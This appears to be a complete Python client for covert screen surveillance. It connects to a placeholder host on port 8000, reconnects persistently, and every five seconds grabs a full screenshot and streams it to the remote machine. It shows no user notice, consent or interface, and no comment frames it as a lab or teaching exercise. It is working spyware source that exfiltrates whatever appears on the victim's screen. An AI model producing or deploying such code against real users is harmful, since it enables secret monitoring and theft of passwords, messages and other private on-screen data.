from PIL import ImageGrab
import io
import socket
import time
import struct

def connect_to_host():
	server_address = ("<HOST IP>", 8000)
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect(server_address)
			break
		except socket.error:
			time.sleep(3)
	return sock

def take_screenshot(sleep_time):
	global sock
	screenshot = ImageGrab.grab()
	buffer = io.BytesIO()

	screenshot.save(buffer, format="PNG")
	screenshot_data = buffer.getvalue()

	try:
		sock.sendall(struct.pack("!I", len(screenshot_data)))
		sock.sendall(screenshot_data)
		time.sleep(sleep_time)
	except socket.error:
		sock = connect_to_host()

sock = connect_to_host()
while True:
	take_screenshot(5)